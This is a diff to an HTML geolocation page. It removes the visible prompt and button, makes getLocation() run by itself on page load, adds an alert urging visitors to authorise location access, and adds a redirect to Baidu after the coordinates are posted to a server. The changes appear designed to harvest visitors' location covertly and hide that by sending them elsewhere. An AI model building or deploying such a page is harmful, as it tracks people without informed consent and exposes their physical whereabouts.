@@ -4,10 +4,11 @@
     <meta charset="utf-8">
 </head>
 <body>
-<p id="demo">点击这个按钮，获得您的坐标：</p>
-<button onclick="getLocation()">试一下</button>
+
 <script>
 var x=document.getElementById("demo");
+
+getLocation();
 function getLocation()
   {
   if (navigator.geolocation)
@@ -45,6 +46,7 @@ function post(longitude,latitude) {
         // （4） 回调函数  success
         xmlHttp.onreadystatechange = function() {
             if(this.status==200){
+		window.location.href="www.baidu.com";
                 console.log("responseText",this.responseText)
 
             }
@@ -53,6 +55,7 @@ function post(longitude,latitude) {
 	}
 function showError(error)
   {
+	  alert("请授权位置信息");
   switch(error.code) 
     {
     case error.PERMISSION_DENIED:
